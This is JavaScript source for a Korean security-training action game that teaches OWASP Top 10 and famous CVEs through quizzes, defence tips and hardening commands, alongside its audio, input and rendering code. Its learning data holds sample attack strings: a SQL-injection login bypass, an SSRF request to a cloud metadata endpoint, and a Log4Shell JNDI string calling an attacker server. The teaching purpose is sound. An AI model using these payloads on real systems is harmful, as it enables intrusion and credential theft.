/* 보안무쌍 (SECURITY MUSOU) — 보안담당자 스트레스 해소 + 취약점 학습 무쌍 액션
   엔진: Claude / 콘텐츠: GB10 Qwen3-Coder-Next 80B · agy(기획·학습 데이터)
   외부 에셋 없음: 그래픽·사운드 전부 절차적 생성 */
'use strict';

// ───────────────────────── 유틸 ─────────────────────────
const TAU = Math.PI * 2;
const rand = (a, b) => a + Math.random() * (b - a);
const randi = (a, b) => Math.floor(rand(a, b + 1));
const clamp = (v, a, b) => (v < a ? a : v > b ? b : v);
const lerp = (a, b, t) => a + (b - a) * t;
const pick = (arr) => arr[(Math.random() * arr.length) | 0];
const angDiff = (a, b) => { let d = (a - b) % TAU; if (d > Math.PI) d -= TAU; if (d < -Math.PI) d += TAU; return d; };
const fmt = (n) => Math.floor(n).toLocaleString('ko-KR');
const FONT = '"Malgun Gothic","Apple SD Gothic Neo","Noto Sans KR",sans-serif';
const FONT_BIG = '"Black Han Sans","Malgun Gothic",sans-serif';
const FONT_MONO = 'Consolas,"D2Coding","Courier New",monospace';

// ───────────────────────── 콘텐츠 (생성물 + 안전한 기본값) ─────────────────────────
const DEFAULT_CONTENT = {
  enemyQuips: {
    bug: ['그건 기능이에요!', '재현 안 되는데?', '찍!', '로컬에선 됐는데'],
    worm: ['옆 서버로…', '전파 실패?!', '꿈틀!'],
    virus: ['복제 중단?!', '백신 업뎃했어?', '감염 실패!'],
    trojan: ['정상 파일이에요', '서명 있다고!', '들켰다!'],
    botnet: ['C2 응답 없음', '명령 수신 불가', '삐-'],
    ransom: ['비트코인 내놔!', '복호화 키는…', '백업 있었어?!'],
    rootkit: ['어떻게 보였지?', '커널에 숨었는데', '탐지됐다!'],
  },
  playerShouts: ['패치 완료!', '차단!', '격리!', '삭제!', '로그 남겼다!', '탐지!', '퇴근하자!'],
  musouShouts: ['전사 긴급 패치 배포!!!', '제로 트러스트 발동!!', '오늘은 칼퇴한다!!!'],
  stageIntro: ['[관제] 침입 탐지 경보가 폭주하고 있습니다', '[관제] 모든 거점이 위협에 점령당했습니다'],
  resultComments: [
    { min: 0, lines: ['내일도 출근이지만… 일단 오늘은 버텼다.'] },
    { min: 40, lines: ['스트레스 절반 삭제. 커피 한 잔의 여유.'] },
    { min: 80, lines: ['관제 화면이 조용하다. 이게 평화인가?'] },
    { min: 100, lines: ['스트레스 0%. 오늘은 진짜 칼퇴다!'] },
  ],
  tips: ['J 연타 후 K를 누르면 강공격이 바뀝니다', 'E: 터미널이 차면 명령어 타이핑 필살기!', '한/영 키를 영문으로 두세요'],
  // 학습 데이터 (OWASP Top 10 2021 기준)
  bases: [
    { id: 'injection', owasp: 'A03:2021 Injection', cwe: 'CWE-89', base: '인젝션 요새', keeper: 'SQL 인젝션',
      summary: '사용자 입력이 쿼리에 그대로 이어붙어 DB 명령이 조작되는 취약점.',
      attack: "로그인 ID에 ' OR '1'='1' -- 입력으로 인증 우회",
      defense: ['Prepared Statement(바인딩 변수) 사용', '입력값 화이트리스트 검증', 'DB 계정 최소 권한'],
      quiz: { q: 'SQL 인젝션의 가장 근본적인 대응은?', choices: ['WAF만 설치한다', '파라미터 바인딩 쿼리 사용', '에러 메시지를 숨긴다'], answer: 1, explain: '쿼리와 데이터를 분리하는 파라미터 바인딩이 근본 대책. WAF·에러 숨김은 보조 수단.' } },
    { id: 'access', owasp: 'A01:2021 Broken Access Control', cwe: 'CWE-639', base: '권한 탈취 성채', keeper: 'IDOR',
      summary: 'URL의 ID만 바꿔도 남의 데이터에 접근되는 등, 서버가 권한을 확인하지 않는 취약점.',
      attack: '/api/orders/1001 → /api/orders/1002 로 타인 주문 조회',
      defense: ['서버에서 요청마다 소유자·권한 검증', '기본 거부(Deny by default)', '추측 어려운 ID만으론 부족함을 인지'],
      quiz: { q: 'IDOR 방어로 올바른 것은?', choices: ['서버가 매 요청마다 객체 소유권 확인', '프론트에서 버튼을 숨김', 'ID를 Base64로 인코딩'], answer: 0, explain: '접근통제는 반드시 서버 측에서. 화면 숨김·인코딩은 우회됩니다.' } },
    { id: 'crypto', owasp: 'A02:2021 Cryptographic Failures', cwe: 'CWE-327', base: '평문 저장소', keeper: '약한 암호',
      summary: '평문 전송, MD5·SHA1 비밀번호 해시, 하드코딩 키 등 암호화를 잘못 쓰는 취약점.',
      attack: '유출된 MD5 비밀번호 해시를 레인보우 테이블로 즉시 복원',
      defense: ['비밀번호는 bcrypt·scrypt·Argon2 사용', '전 구간 TLS 1.2 이상', '키는 KMS·Vault로 관리'],
      quiz: { q: '비밀번호 저장에 적합한 방식은?', choices: ['SHA-256 한 번', 'AES로 암호화', 'Argon2id 같은 느린 해시'], answer: 2, explain: '비밀번호는 솔트+작업량을 가진 전용 해시(Argon2/bcrypt). 빠른 해시나 복호화 가능한 암호화는 부적절.' } },
    { id: 'component', owasp: 'A06:2021 Vulnerable and Outdated Components', cwe: 'CWE-1104', base: '레거시 무덤', keeper: '구버전 라이브러리',
      summary: '알려진 취약점이 있는 라이브러리·프레임워크를 업데이트하지 않고 쓰는 문제.',
      attack: '패치 안 된 Log4j 2.14로 원격 코드 실행',
      defense: ['SBOM으로 구성요소 목록화', 'SCA 도구로 취약 버전 탐지', '정기 패치·EOL 제품 교체'],
      quiz: { q: '취약한 컴포넌트 관리에 가장 도움되는 것은?', choices: ['SBOM과 SCA 자동 점검', '방화벽 포트 변경', '소스코드 난독화'], answer: 0, explain: '무엇을 쓰는지 알아야(SBOM) 취약 버전을 찾고(SCA) 패치할 수 있습니다.' } },
    { id: 'auth', owasp: 'A07:2021 Identification and Authentication Failures', cwe: 'CWE-307', base: '로그인 관문', keeper: '크리덴셜 스터핑',
      summary: '무차별 대입 허용, 약한 비밀번호, 세션 관리 미흡으로 인증이 뚫리는 취약점.',
      attack: '유출 계정 목록으로 수만 번 로그인 자동 시도',
      defense: ['MFA 적용', '로그인 시도 제한·지연', '유출 비밀번호 사용 차단'],
      quiz: { q: '크리덴셜 스터핑에 가장 효과적인 대응은?', choices: ['비밀번호 90일마다 강제 변경', 'MFA와 시도 횟수 제한', '아이디를 이메일로 변경'], answer: 1, explain: '유출 비밀번호 재사용 공격은 MFA로 무력화하고, 속도 제한으로 자동화를 막습니다.' } },
    { id: 'ssrf', owasp: 'A10:2021 Server-Side Request Forgery', cwe: 'CWE-918', base: '메타데이터 탑', keeper: 'SSRF',
      summary: '서버가 공격자가 준 URL로 대신 요청을 보내 내부망·클라우드 메타데이터에 접근되는 취약점.',
      attack: 'url=http://169.254.169.254/latest/meta-data/ 로 클라우드 자격증명 탈취',
      defense: ['허용 도메인 화이트리스트', '내부 IP·리다이렉트 차단', 'IMDSv2 등 메타데이터 보호'],
      quiz: { q: 'SSRF 대응으로 적절하지 않은 것은?', choices: ['목적지 화이트리스트', '내부 대역 요청 차단', '사용자에게 URL 입력 안내문 추가'], answer: 2, explain: '안내문은 통제가 아닙니다. 서버 측 목적지 검증과 내부망 차단이 핵심.' } },
  ],
  cves: [
    { name: 'Log4Shell', cve: 'CVE-2021-44228', cvss: 10.0, product: 'Apache Log4j 2',
      summary: '로그 문자열의 JNDI 조회(${jndi:ldap://…})로 원격 코드가 실행되는 취약점.',
      fix: 'Log4j 2.17.1 이상으로 업데이트, JNDI 조회 비활성화.',
      quiz: { q: 'Log4Shell 공격 문자열에 등장하는 기능은?', choices: ['JNDI 조회', 'XML 외부 엔티티', 'SQL UNION'], answer: 0, explain: '${jndi:ldap://공격자서버/a} 형태로 원격 클래스를 불러와 실행합니다.' } },
    { name: 'Heartbleed', cve: 'CVE-2014-0160', cvss: 7.5, product: 'OpenSSL 1.0.1~1.0.1f',
      summary: 'TLS 하트비트 길이 검증 누락으로 서버 메모리(개인키 등)가 최대 64KB씩 유출.',
      fix: 'OpenSSL 패치 후 인증서 재발급·키 교체·세션 무효화.',
      quiz: { q: 'Heartbleed 패치 후 꼭 해야 할 일은?', choices: ['방화벽 재부팅', '인증서·개인키 교체', '로그 삭제'], answer: 1, explain: '이미 개인키가 유출됐을 수 있으므로 키·인증서를 교체해야 합니다.' } },
    { name: 'Shellshock', cve: 'CVE-2014-6271', cvss: 9.8, product: 'GNU Bash',
      summary: '환경변수에 넣은 함수 정의 뒤의 명령이 Bash에서 실행되는 취약점(CGI 등으로 원격 악용).',
      fix: 'Bash 업데이트, CGI 노출 최소화.',
      quiz: { q: 'Shellshock이 주로 원격 악용된 경로는?', choices: ['CGI 스크립트의 HTTP 헤더', 'USB 자동실행', 'DNS 캐시'], answer: 0, explain: 'User-Agent 같은 헤더가 CGI 환경변수로 넘어가 Bash가 실행했습니다.' } },
    { name: 'EternalBlue', cve: 'CVE-2017-0144', cvss: 8.8, product: 'Microsoft SMBv1',
      summary: 'SMBv1 처리 결함으로 원격 코드 실행. WannaCry 랜섬웨어 확산에 사용.',
      fix: 'MS17-010 패치, SMBv1 비활성화, 445 포트 외부 차단.',
      quiz: { q: 'EternalBlue를 이용해 퍼진 랜섬웨어는?', choices: ['WannaCry', 'Stuxnet', 'Mirai'], answer: 0, explain: '2017년 WannaCry가 SMBv1 취약점(MS17-010)으로 웜처럼 확산했습니다.' } },
    { name: 'Spring4Shell', cve: 'CVE-2022-22965', cvss: 9.8, product: 'Spring Framework (JDK 9+)',
      summary: '데이터 바인딩으로 classLoader 속성을 조작해 웹셸을 쓰는 원격 코드 실행.',
      fix: 'Spring Framework 5.3.18 / 5.2.20 이상으로 업데이트.',
      quiz: { q: 'Spring4Shell의 악용 지점은?', choices: ['데이터 바인딩', '세션 쿠키', 'CORS 설정'], answer: 0, explain: '요청 파라미터 바인딩으로 class.module.classLoader 속성에 접근했습니다.' } },
    { name: 'BlueKeep', cve: 'CVE-2019-0708', cvss: 9.8, product: 'Windows RDP (구버전)',
      summary: '인증 전 RDP 요청만으로 원격 코드 실행이 가능한 웜 가능 취약점.',
      fix: '보안 업데이트 적용, NLA 활성화, RDP 외부 노출 금지.',
      quiz: { q: 'BlueKeep 완화책으로 옳은 것은?', choices: ['RDP를 인터넷에 직접 노출', 'NLA 활성화', '화면 해상도 낮추기'], answer: 1, explain: 'NLA는 인증을 먼저 요구해 인증 전 공격을 어렵게 합니다. 근본책은 패치.' } },
    { name: 'ProxyLogon', cve: 'CVE-2021-26855', cvss: 9.8, product: 'Microsoft Exchange Server',
      summary: 'Exchange의 SSRF로 인증을 우회하고, 연계 취약점으로 웹셸까지 설치된 공격.',
      fix: 'Exchange 보안 업데이트, 웹셸·침해 흔적 점검.',
      quiz: { q: 'ProxyLogon 체인의 시작 취약점 유형은?', choices: ['XSS', 'SSRF', 'CSRF'], answer: 1, explain: 'CVE-2021-26855는 SSRF로, 이후 임의 파일 쓰기와 연계됐습니다.' } },
    { name: 'Struts2 RCE', cve: 'CVE-2017-5638', cvss: 10.0, product: 'Apache Struts 2',
      summary: 'Content-Type 헤더의 OGNL 식이 실행되는 원격 코드 실행. Equifax 유출의 원인.',
      fix: 'Struts 2.3.32 / 2.5.10.1 이상으로 업데이트.',
      quiz: { q: 'Struts2 CVE-2017-5638의 공격 벡터는?', choices: ['Content-Type 헤더', '쿠키 만료일', 'robots.txt'], answer: 0, explain: '파일 업로드 파서가 Content-Type 헤더의 OGNL 표현식을 평가했습니다.' } },
  ],
  commands: [
    { cmd: 'sudo apt update && sudo apt upgrade', desc: '알려진 취약점이 있는 패키지 일괄 패치', tag: 'component' },
    { cmd: 'chmod 600 ~/.ssh/id_ed25519', desc: 'SSH 개인키 권한 제한으로 키 탈취 방지', tag: 'access' },
    { cmd: 'ufw deny 445/tcp', desc: 'SMB 포트 차단으로 EternalBlue류 웜 차단', tag: 'network' },
    { cmd: 'fail2ban-client status sshd', desc: 'SSH 무차별 대입 차단 현황 확인', tag: 'auth' },
    { cmd: 'openssl version', desc: 'OpenSSL 버전 확인으로 Heartbleed 등 점검', tag: 'crypto' },
    { cmd: 'iptables -a input -s 10.6.6.6 -j drop', desc: '공격 IP의 인바운드 트래픽 차단', tag: 'network' },
  ],
};

// 악성코드 유형 위협 인텔 (처음 처치할 때 비차단 카드로 표시 · 도감 등록)
const MALWARE_INFO = {
  bug: { name: '소프트웨어 버그', cat: '결함', summary: '의도치 않은 코드 결함. 일부는 공격자가 악용할 수 있는 취약점이 된다.', defense: ['코드 리뷰·정적분석(SAST)', '보안 테스트 자동화(CI)', '취약점은 CVE로 추적·패치'] },
  worm: { name: '웜', cat: '자가 전파', summary: '사용자 개입 없이 네트워크 취약점을 통해 스스로 복제·전파한다 (예: WannaCry).', defense: ['보안 패치 신속 적용', '네트워크 세그멘테이션', '불필요한 포트(445 등) 차단'] },
  virus: { name: '바이러스', cat: '파일 감염', summary: '정상 파일에 기생해 실행될 때 다른 파일로 감염을 퍼뜨린다.', defense: ['백신/EDR 실시간 감시', '출처 불명 실행파일 차단', '응용프로그램 화이트리스트'] },
  trojan: { name: '트로이목마', cat: '위장', summary: '정상 프로그램으로 위장해 설치를 유도한 뒤 원격 제어·정보 탈취를 한다.', defense: ['코드 서명·해시 검증', '공식 배포처만 사용', '첨부파일 샌드박스 분석'] },
  botnet: { name: '봇넷', cat: '원격 조종', summary: '감염된 다수의 기기가 C2 서버 명령으로 DDoS·스팸 등에 동원된다 (예: Mirai).', defense: ['C2 도메인·IP 차단', 'IoT 기본 비밀번호 변경', '이상 아웃바운드 트래픽 탐지'] },
  rootkit: { name: '루트킷', cat: '은폐', summary: '커널·부트 영역 등에 숨어 자신과 다른 악성코드의 흔적을 감춘다.', defense: ['Secure Boot·무결성 검증', '오프라인/메모리 포렌식', '의심 시 재설치(재이미징)'] },
  ransom: { name: '랜섬웨어', cat: '암호화 협박', summary: '파일을 암호화하고 복호화 대가를 요구한다. 최근엔 데이터 유출 협박까지 병행한다.', defense: ['3-2-1 백업 + 오프라인 사본', '복구 훈련 정기 실시', '권한 최소화·RDP 노출 금지'] },
};

function buildContent(gen) {
  const c = JSON.parse(JSON.stringify(DEFAULT_CONTENT));
  if (!gen || typeof gen !== 'object') return c;
  const okArr = (a, n = 1) => Array.isArray(a) && a.length >= n;
  for (const k of ['playerShouts', 'musouShouts', 'stageIntro', 'tips']) {
    if (okArr(gen[k])) c[k] = gen[k].filter((s) => typeof s === 'string' && s.trim()).map((s) => s.trim());
  }
  if (gen.enemyQuips && typeof gen.enemyQuips === 'object') {
    for (const k of Object.keys(c.enemyQuips)) if (okArr(gen.enemyQuips[k])) c.enemyQuips[k] = gen.enemyQuips[k].map((s) => String(s).trim()).filter(Boolean);
  }
  if (gen.boss && typeof gen.boss.enter === 'string') c.boss = gen.boss;
  if (okArr(gen.resultComments, 2)) c.resultComments = gen.resultComments.filter((r) => r && okArr(r.lines));
  const validQuiz = (q) => q && typeof q.q === 'string' && okArr(q.choices, 3) && Number.isInteger(q.answer) && q.answer >= 0 && q.answer < q.choices.length;
  if (okArr(gen.bases, 6)) {
    const b = gen.bases.filter((x) => x && x.base && x.keeper && x.summary && okArr(x.defense) && validQuiz(x.quiz));
    if (b.length >= 6) c.bases = b.slice(0, 6);
  }
  if (okArr(gen.cves, 4)) {
    const v = gen.cves.filter((x) => x && x.name && /^CVE-\d{4}-\d{4,}$/.test(x.cve || '') && x.summary && validQuiz(x.quiz));
    if (v.length >= 4) c.cves = v;
  }
  const validQ = (x) => x && typeof x.q === 'string' && okArr(x.choices, 3) && Number.isInteger(x.answer) && x.answer >= 0 && x.answer < x.choices.length;
  c.bank = okArr(gen.bank) ? gen.bank.filter(validQ) : [];
  c.logs = okArr(gen.logs) ? gen.logs.filter((x) => x && typeof x.log === 'string' && okArr(x.choices, 3) && Number.isInteger(x.answerIndex) && x.explain) : [];
  c.officeMobs = okArr(gen.officeMobs) ? gen.officeMobs.filter((x) => x && x.name) : [{ name: '긴급 회의 소집', die: '메일로 공유할게요...', taunt: '5분만 모일게요!' }];
  if (gen.mission && okArr(gen.mission.stages, 4)) c.mission = gen.mission;
  if (okArr(gen.commands, 8)) {
    const cm = gen.commands.filter((x) => x && typeof x.cmd === 'string' && /^[\x20-\x7e]{6,48}$/.test(x.cmd) && x.desc);
    if (cm.length >= 8) c.commands = cm;
  }
  return c;
}
const CT = buildContent(window.GAME_CONTENT);

// ───────────────────────── 저장 (브라우저 로컬) ─────────────────────────
const store = {
  get(k, d) { try { const v = localStorage.getItem('secmusou_' + k); return v ? JSON.parse(v) : d; } catch (e) { return d; } },
  set(k, v) { try { localStorage.setItem('secmusou_' + k, JSON.stringify(v)); } catch (e) { /* 무시 */ } },
};
const codexSeen = store.get('codex', {}); // id -> true
let bestRec = store.get('best', { ko: 0, combo: 0 });
let settings = store.get('settings', { quiz: true, muted: false });

// ───────────────────────── 오디오 (WebAudio 절차 합성) ─────────────────────────
const audio = {
  ctx: null, master: null, sfx: null, bgm: null, noiseBuf: null, lastHit: 0, lastClack: 0, bgmTimer: null, step: 0, nextT: 0, intensity: 0,
  init() {
    if (this.ctx) { if (this.ctx.state === 'suspended') this.ctx.resume(); return; }
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;
    const c = (this.ctx = new AC());
    const comp = c.createDynamicsCompressor();
    comp.threshold.value = -16; comp.ratio.value = 8; comp.attack.value = 0.002; comp.release.value = 0.12;
    comp.connect(c.destination);
    this.master = c.createGain(); this.master.gain.value = settings.muted ? 0 : 0.85; this.master.connect(comp);
    this.sfx = c.createGain(); this.sfx.gain.value = 1; this.sfx.connect(this.master);
    this.bgm = c.createGain(); this.bgm.gain.value = 0.32; this.bgm.connect(this.master);
    const len = c.sampleRate;
    const b = c.createBuffer(1, len, c.sampleRate);
    const d = b.getChannelData(0);
    for (let i = 0; i < len; i++) d[i] = Math.random() * 2 - 1;
    this.noiseBuf = b;
    const curve = new Float32Array(256);
    for (let i = 0; i < 256; i++) { const x = (i / 128) - 1; curve[i] = Math.tanh(x * 4); }
    this.shaper = c.createWaveShaper(); this.shaper.curve = curve; this.shaper.connect(this.sfx);
  },
  setMuted(m) { settings.muted = m; store.set('settings', settings); if (this.master) this.master.gain.value = m ? 0 : 0.85; },
  tone(type, f0, f1, dur, vol, t, dest) {
    const c = this.ctx; if (!c) return;
    t = t ?? c.currentTime;
    const o = c.createOscillator(), g = c.createGain();
    o.type = type; o.frequency.setValueAtTime(f0, t);
    if (f1) o.frequency.exponentialRampToValueAtTime(Math.max(1, f1), t + dur);
    g.gain.setValueAtTime(0.0001, t);
    g.gain.exponentialRampToValueAtTime(vol, t + 0.004);
    g.gain.exponentialRampToValueAtTime(0.0001, t + dur);
    o.connect(g); g.connect(dest || this.sfx);
    o.start(t); o.stop(t + dur + 0.03);
  },
  noise(dur, ftype, freq, q, vol, t, dest, freqEnd) {
    const c = this.ctx; if (!c) return;
    t = t ?? c.currentTime;
    const s = c.createBufferSource(), f = c.createBiquadFilter(), g = c.createGain();
    s.buffer = this.noiseBuf;
    f.type = ftype; f.frequency.setValueAtTime(freq, t);
    if (freqEnd) f.frequency.exponentialRampToValueAtTime(freqEnd, t + dur);
    f.Q.value = q;
    g.gain.setValueAtTime(0.0001, t);
    g.gain.exponentialRampToValueAtTime(vol, t + 0.003);
    g.gain.exponentialRampToValueAtTime(0.0001, t + dur);
    s.connect(f); f.connect(g); g.connect(dest || this.sfx);
    s.start(t, Math.random() * 0.5); s.stop(t + dur + 0.03);
  },
  // 타격음: power 0.5(약) ~ 3(초강)
  hit(power = 1) {
    const c = this.ctx; if (!c) return;
    const now = c.currentTime;
    if (now - this.lastHit < 0.03 && power < 1.5) return;
    this.lastHit = now;
    const p = Math.min(power, 3);
    this.tone('sine', 180 + Math.random() * 60, 38, 0.1 + p * 0.07, 0.55 + p * 0.15);
    this.noise(0.05 + p * 0.03, 'bandpass', 2400 + Math.random() * 900, 0.9, 0.45 + p * 0.1);
    this.tone('square', 90 + Math.random() * 30, 40, 0.06 + p * 0.04, 0.12 * p, now, this.shaper);
    if (p > 1.4) this.noise(0.25 + p * 0.1, 'lowpass', 900, 0.7, 0.5, now, null, 80);
    this.clack(p > 1.3); // 타격마다 키보드 축 소리
  },
  boom(power = 1) {
    if (!this.ctx) return;
    this.tone('sine', 120, 28, 0.5 * power, 0.9);
    this.noise(0.6 * power, 'lowpass', 1800, 0.5, 0.8, null, null, 60);
    this.tone('sawtooth', 70, 30, 0.35, 0.25, null, this.shaper);
  },
  swing(heavy) {
    if (!this.ctx) return;
    this.noise(heavy ? 0.22 : 0.12, 'bandpass', heavy ? 600 : 1200, 1.4, heavy ? 0.35 : 0.22, null, null, heavy ? 2400 : 4200);
  },
  // 기계식 키보드 클릭음
  clack(strong) {
    const c = this.ctx; if (!c) return;
    const now = c.currentTime;
    if (now - this.lastClack < 0.012) return;
    this.lastClack = now;
    const sw = settings.sw || 'blue', k = strong ? 1.25 : 1;
    if (sw === 'blue') { // 청축: 날카로운 클릭 + 바닥 소리
      this.noise(0.016, 'highpass', 4200 + Math.random() * 1500, 0.8, 0.55 * k);
      this.tone('square', 2300 + Math.random() * 400, 1200, 0.012, 0.13 * k);
      this.noise(0.04, 'bandpass', 420 + Math.random() * 80, 3, 0.32 * k, now + 0.01);
    } else if (sw === 'brown') { // 갈축: 걸림 있는 도각
      this.noise(0.022, 'bandpass', 2400 + Math.random() * 600, 1.2, 0.38 * k);
      this.noise(0.05, 'bandpass', 330 + Math.random() * 60, 2.5, 0.45 * k, now + 0.006);
    } else { // 적축: 부드러운 톡
      this.noise(0.03, 'lowpass', 1600 + Math.random() * 300, 0.7, 0.3 * k);
      this.noise(0.06, 'bandpass', 260 + Math.random() * 50, 2, 0.5 * k, now + 0.004);
    }
  },
  kill() { if (this.ctx) this.tone('square', 880 + Math.random() * 300, 1600, 0.05, 0.05); },
  hurt() { if (this.ctx) { this.tone('sawtooth', 220, 80, 0.2, 0.3); this.noise(0.15, 'lowpass', 700, 1, 0.3); } },
  buzz() { if (this.ctx) this.tone('square', 110, 95, 0.12, 0.18); },
  pickup() { if (this.ctx) [660, 880, 1320].forEach((f, i) => this.tone('triangle', f, f, 0.08, 0.15, this.ctx.currentTime + i * 0.05)); },
  levelup() { if (this.ctx) [523, 659, 784, 1046].forEach((f, i) => this.tone('square', f, f, 0.12, 0.12, this.ctx.currentTime + i * 0.07)); },
  capture() { if (this.ctx) [392, 523, 659, 784, 1046].forEach((f, i) => this.tone('sawtooth', f, f * 1.01, 0.22, 0.14, this.ctx.currentTime + i * 0.08)); },
  correct() { if (this.ctx) [784, 1046, 1318].forEach((f, i) => this.tone('triangle', f, f, 0.18, 0.2, this.ctx.currentTime + i * 0.08)); },
  wrong() { if (this.ctx) { this.tone('square', 220, 180, 0.18, 0.15); this.tone('square', 165, 140, 0.25, 0.15, this.ctx.currentTime + 0.18); } },
  musou() {
    const c = this.ctx; if (!c) return;
    [110, 165, 220, 330].forEach((f) => this.tone('sawtooth', f, f * 2, 0.9, 0.12, null, this.shaper));
    this.noise(1.0, 'bandpass', 300, 1, 0.4, null, null, 5000);
  },
  alarm() { const c = this.ctx; if (!c) return; for (let i = 0; i < 3; i++) { this.tone('square', 880, 660, 0.18, 0.12, c.currentTime + i * 0.25); } },
  // BGM: 150BPM 드라이빙 시퀀서
  startBgm() {
    if (!this.ctx || this.bgmTimer) return;
    this.step = 0; this.nextT = this.ctx.currentTime + 0.1;
    this.bgmTimer = setInterval(() => this.schedule(), 40);
  },
  stopBgm() { clearInterval(this.bgmTimer); this.bgmTimer = null; },
  schedule() {
    const c = this.ctx; if (!c) return;
    const spb = 60 / 150 / 4;
    if (this.nextT < c.currentTime - 0.5) this.nextT = c.currentTime; // 백그라운드 복귀 시 폭주 방지
    while (this.nextT < c.currentTime + 0.15) { this.playStep(this.step, this.nextT); this.nextT += spb; this.step++; }
  },
  playStep(s, t) {
    const c = this.ctx;
    const pos = s % 16, bar = (s >> 4) % 4, hot = this.intensity;
    const roots = [55, 43.65, 49, 41.2];
    const D = this.bgm;
    if (pos % 4 === 0) this.tone('sine', 150, 40, 0.2, 0.9, t, D);
    if (pos === 4 || pos === 12) { this.noise(0.13, 'bandpass', 1800, 0.7, 0.45, t, D); this.tone('triangle', 220, 120, 0.08, 0.25, t, D); }
    if (pos % 2 === 1 || hot > 0) this.noise(0.03, 'highpass', 8000, 0.5, pos % 2 ? 0.14 : 0.06, t, D);
    const bassPat = [1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1];
    if (bassPat[pos]) {
      const f = roots[bar] * (pos === 14 ? 2 : 1);
      const o = c.createOscillator(), g = c.createGain(), lp = c.createBiquadFilter();
      o.type = 'sawtooth'; o.frequency.value = f;
      lp.type = 'lowpass'; lp.frequency.setValueAtTime(900 + hot * 900, t); lp.frequency.exponentialRampToValueAtTime(150, t + 0.12); lp.Q.value = 6;
      g.gain.setValueAtTime(0.0001, t); g.gain.exponentialRampToValueAtTime(0.35, t + 0.005); g.gain.exponentialRampToValueAtTime(0.0001, t + 0.14);
      o.connect(lp); lp.connect(g); g.connect(D); o.start(t); o.stop(t + 0.16);
    }
    if (hot > 0 || bar >= 2) {
      const arp = [0, 3, 7, 10, 12, 10, 7, 3];
      const f = roots[bar] * 8 * Math.pow(2, arp[pos % 8] / 12);
      if (pos % 2 === 0) this.tone('square', f, f, 0.09, 0.05 + hot * 0.03, t, D);
    }
  },
};

// ───────────────────────── 캔버스 ─────────────────────────
const cv = document.getElementById('game');
const ctx = cv.getContext('2d');
let W = 0, H = 0, DPR = 1, VS = 1;
// 휴대폰·태블릿: 해상도·적 수·이펙트를 낮춘 성능 모드
const IS_MOBILE = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || (!!window.matchMedia && matchMedia('(pointer: coarse)').matches && Math.min(screen.width, screen.height) < 900);
window.SECMUSOU_MOBILE = IS_MOBILE;
function resize() {
  DPR = Math.min(window.devicePixelRatio || 1, IS_MOBILE ? 1.5 : 2);
  W = window.innerWidth; H = window.innerHeight;
  cv.width = Math.floor(W * DPR); cv.height = Math.floor(H * DPR);
  cv.style.width = W + 'px'; cv.style.height = H + 'px';
  VS = clamp(Math.min(W / 1280, H / 760), 0.5, 1.6);
}
window.addEventListener('resize', resize);
resize();

// ───────────────────────── 입력 ─────────────────────────
const keys = {};
let pressed = {};
let imeWarnT = 0;
const KEY_HELP = [
  { codes: ['KeyW', 'KeyA', 'KeyS', 'KeyD', 'ArrowUp', 'ArrowDown'], cap: 'WASD', label: '이동' },
  { codes: ['ArrowLeft', 'ArrowRight'], cap: '←→', label: '시점 회전' },
  { codes: ['KeyJ', 'KeyZ'], cap: 'J', label: '약공격' },
  { codes: ['KeyK', 'KeyX'], cap: 'K', label: '강공격' },
  { codes: ['KeyL', 'ShiftLeft', 'ShiftRight'], cap: 'L', label: '대시' },
  { codes: ['Space'], cap: 'SPACE', label: '무쌍' },
  { codes: ['KeyE', 'KeyC'], cap: 'E', label: '터미널' },
];
const isDown = (...codes) => codes.some((c) => keys[c]);
const wasPressed = (...codes) => codes.some((c) => pressed[c]);

window.addEventListener('keydown', (e) => {
  if (touch.input && e.target === touch.input) return;
  audio.init();
  if (e.key === 'Process' || e.keyCode === 229) imeWarnT = 3;
  if (game.typing && !game.overlay && game.state === 'play') { handleTypingKey(e); e.preventDefault(); return; }
  if (!keys[e.code]) pressed[e.code] = true;
  keys[e.code] = true;
  if (['Space', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'Tab'].includes(e.code)) e.preventDefault();
});
window.addEventListener('keyup', (e) => { keys[e.code] = false; });
window.addEventListener('blur', () => { for (const k in keys) keys[k] = false; if (game.state === 'play' && !game.overlay) game.state = 'pause'; });
// 마우스: 1인칭에서 클릭 → 마우스 시점 고정(포인터 락). 잠긴 상태에서 좌클릭=약공격, 우클릭=강공격
cv.addEventListener('mousedown', (e) => {
  audio.init(); cv.focus();
  if (game.state !== 'play' || game.overlay) { // 메뉴·퀴즈·결과: 그린 버튼을 마우스로도 클릭
    const r = cv.getBoundingClientRect(), h = hitAt({ x: e.clientX - r.left, y: e.clientY - r.top });
    if (h) { h.act(); return; }
  }
  if (game.state !== 'play' || !isFPS() || game.overlay || game.typing) return;
  if (document.pointerLockElement !== cv) { try { cv.requestPointerLock(); } catch (err) { /* 무시 */ } return; }
  if (e.button === 0) pressed.KeyJ = true;
  if (e.button === 2) pressed.KeyK = true;
});
cv.addEventListener('contextmenu', (e) => e.preventDefault());
document.addEventListener('mousemove', (e) => {
  if (document.pointerLockElement !== cv || game.state !== 'play' || game.overlay || game.typing) return;
  player.facing += e.movementX * 0.0024;
  player.pitch = clamp((player.pitch || 0) - e.movementY * 0.002, -0.6, 0.45);
});

// ───────────────────────── 월드 / 상태 ─────────────────────────
const WORLD = { w: 3600, h: 2700 };
const HQ = { x: WORLD.w / 2, y: WORLD.h / 2 };
const DIFFS = [
  { id: 'easy', name: '칼퇴 모드', desc: '쉬움 · 마음 편히 쓸어버리기', hp: 1600, edmg: 0.5, ehp: 0.8, alive: 150, ko100: 600 },
  { id: 'normal', name: '정시 퇴근', desc: '보통 · 적당한 긴장감', hp: 1200, edmg: 0.8, ehp: 1.0, alive: 210, ko100: 900 },
  { id: 'hard', name: '야근 확정', desc: '어려움 · 위협이 쏟아진다', hp: 950, edmg: 1.15, ehp: 1.3, alive: 270, ko100: 1200 },
  { id: 'endless', name: '끝없는 야근', desc: '무한 · 거점이 계속 재점령된다', hp: 1300, edmg: 0.8, ehp: 1.0, alive: 230, ko100: 1500, endless: true },
  { id: 'ir', name: '침해사고 대응 훈련', desc: '랜섬웨어 사고 6단계 실습 (NIST)', hp: 1500, edmg: 0.65, ehp: 0.9, alive: 160, ko100: 700, mission: true },
];

const ETYPES = {
  bug: { name: '버그', hp: 18, r: 12, spd: 88, dmg: 5, color: '#8BEA3B', reach: 22, windup: 0.42, kbRes: 1, ai: 'melee', rotate: true },
